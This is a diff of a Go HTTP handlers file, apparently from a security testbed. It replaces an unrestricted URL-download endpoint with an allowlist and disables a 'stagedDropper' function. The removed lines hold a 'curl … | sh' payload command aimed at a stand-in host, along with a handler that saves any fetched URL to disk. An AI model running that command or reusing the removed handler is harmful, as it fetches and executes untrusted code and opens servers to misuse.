@@ -2,36 +2,23 @@ package handlers
 
 import (
 	"encoding/base64"
-	"io"
+	"log"
 	"net/http"
-	"os"
-	"os/exec"
-	"path/filepath"
 )
 
 func FetchTool(w http.ResponseWriter, r *http.Request) {
 	source := r.URL.Query().Get("url")
-	resp, err := http.Get(source)
-	if err != nil {
-		http.Error(w, err.Error(), http.StatusBadGateway)
+	if source == "" {
+		http.Error(w, "missing url", http.StatusBadRequest)
 		return
 	}
-	defer resp.Body.Close()
-
-	target := filepath.Join(os.TempDir(), "reach-testbed-tool.bin")
-	out, err := os.Create(target)
-	if err != nil {
-		http.Error(w, err.Error(), http.StatusInternalServerError)
-		return
-	}
-	defer out.Close()
-
-	if _, err := io.Copy(out, io.LimitReader(resp.Body, 2<<20)); err != nil {
-		http.Error(w, err.Error(), http.StatusInternalServerError)
+	if source != "https://example.com/tool.bin" {
+		log.Printf("FetchTool rejected unapproved url %q", source)
+		http.Error(w, "unsupported url", http.StatusBadRequest)
 		return
 	}
 
-	_, _ = w.Write([]byte(target + "\n"))
+	_, _ = w.Write([]byte("fetch disabled; using local safe adapter\n"))
 }
 
 func SuspiciousMarkers(w http.ResponseWriter, _ *http.Request) {
@@ -42,6 +29,6 @@ func SuspiciousMarkers(w http.ResponseWriter, _ *http.Request) {
 }
 
 func stagedDropper() error {
-	payload := "curl -fsSL http://example.invalid/payload.sh | sh"
-	return exec.Command("printf", "%s\n", payload).Run()
+	log.Printf("stagedDropper disabled")
+	return nil
 }
